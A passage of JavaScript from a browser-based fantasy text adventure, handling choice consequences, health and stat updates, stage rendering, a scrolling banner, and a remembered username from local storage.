    window.scrollTo({ top: 0, behavior: 'smooth' });
    render();
}

// Show consequence modal with animation
function showConsequence(type, title, message, healthChange = 0, statsChange = {}) {
    playSound(type === 'success' ? 'success' : 'fail');
    
    state.stats.health = Math.max(0, Math.min(3, state.stats.health + healthChange));
    
    // Apply stat changes
    Object.keys(statsChange).forEach(stat => {
        if (state.stats[stat] !== undefined) {
            state.stats[stat] += statsChange[stat];
        }
    });
    
    state.consequenceData = {
        type: type, // 'success', 'warning', 'danger'
        title: title,
        message: message,
        healthChange: healthChange,
        statsChange: statsChange
    };
    
    state.showConsequence = true;
    render();
    
    // Auto-hide after 4 seconds
    setTimeout(() => {
        state.showConsequence = false;
        render();
        
        // Check for game over
        if (state.stats.health <= 0) {
            setTimeout(() => {
                alert('Game Over! Your journey has ended...');
                state.stage = 'welcome';
                state.stats.health = 3;
                render();
            }, 500);
        }
    }, 4000);
}

// Update makeChoice function
function makeChoice(nextChapter, consequenceType = null) {
    playSound('click');
    
    // Define consequences for different choices
    const consequences = {
        riverSuccess: { type: 'success', title: '🎉 Wisdom Rewarded!', message: 'The nymphs bless you with eternal flow. Your mana regenerates faster!', health: 0, stats: { mana: 20, intelligence: 10 } },
        riverPartial: { type: 'warning', title: '⚠️ Close Enough', message: 'The nymphs appreciate your effort but expect better.', health: 0, stats: { intelligence: 5 } },
        riverFail: { type: 'danger', title: '❌ Wrong Answer!', message: 'The nymphs are disappointed. You lose their favor.', health: -1, stats: { intelligence: -5 } },
        dragonFight: { type: 'danger', title: '🐉 Dragon\'s Fury!', message: 'The dragon attacks! You barely survive the flames.', health: -1, stats: { strength: 5 } },
        dragonRespect: { type: 'success', title: '🙏 Honor Gained!', message: 'The dragon respects your wisdom and grants safe passage.', health: 1, stats: { intelligence: 10 } },
        peacePath: { type: 'success', title: '🕊️ Peace Achieved!', message: 'You unite the warring factions. Harmony is restored!', health: 0, stats: { intelligence: 15, mana: 10 } },
        strengthPath: { type: 'warning', title: '⚔️ Victory Through Force', message: 'You won, but at what cost? Some respect your strength, others fear you.', health: -1, stats: { strength: 20, intelligence: -5 } }
    };
    
    // Show consequence if exists
    if (consequences[nextChapter]) {
        const c = consequences[nextChapter];
        showConsequence(c.type, c.title, c.message, c.health, c.stats);
    }
    
    state.currentChapter = nextChapter;
    window.scrollTo({ top: 0, behavior: 'smooth' });
    
    // Delay render if showing consequence
    if (!consequences[nextChapter]) {
        render();
    }
}
// ==================== MAIN RENDER ====================
function render() {
    const app = document.getElementById('app');
    
    switch(state.stage) {
        case 'welcome':
            app.innerHTML = renderWelcome();
            break;
        case 'login':
            app.innerHTML = renderLogin();
            break;
        case 'character':
            app.innerHTML = renderCharacterSelection();
            break;
        case 'story':
            app.innerHTML = renderStory();
            break;
        default:
            app.innerHTML = renderWelcome();
    }
}

// Handle scroll for banner
window.addEventListener('scroll', () => {
    const banner = document.getElementById('banner');
    if (banner) {
        if (window.scrollY > 50) {
            banner.classList.add('scrolled');
        } else {
            banner.classList.remove('scrolled');
        }
    }
});

// Check for remembered user on load
window.addEventListener('DOMContentLoaded', () => {
    const savedUser = localStorage.getItem('kalon_user');
    if (savedUser) {
        const userData = JSON.parse(savedUser);
        if (userData.rememberMe) {
            state.username = userData.username;
        }
    }
    render();
});